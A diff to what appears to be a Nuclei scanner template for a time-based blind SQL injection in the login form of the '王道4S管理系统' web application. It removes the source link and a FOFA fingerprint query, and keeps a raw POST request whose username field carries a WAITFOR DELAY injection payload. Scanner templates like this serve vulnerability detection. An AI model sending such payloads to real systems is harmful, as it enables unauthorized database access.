@@ -3,14 +3,8 @@ info:
   name: 王道4S管理系统 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qkpcytnwntzz5go3
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qkpcytnwntzz5go3
-    fofa: web.body="PixelsPerInch"&&web.body="AxBorderStyle"&&web.body="DropTarget"
 http:
 - raw:
   - 'POST / HTTP/1.1
@@ -41,8 +35,6 @@ http:
 
 
     Cookie: ASP.NET_SessionId=e5zzymvrqc2ah0dg5xro1lbi
-
-
 
 
     ScriptManager1=UpdatePanel3|btnLogin&__EVENTTARGET=btnLogin&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=&ddlUserName=&txtUserName=1'';WAITFOR DELAY ''0:0:5''--&txtPassWord=1&cbBossedBroadcast=on&txtMACAddr=&__ASYNCPOST=true&
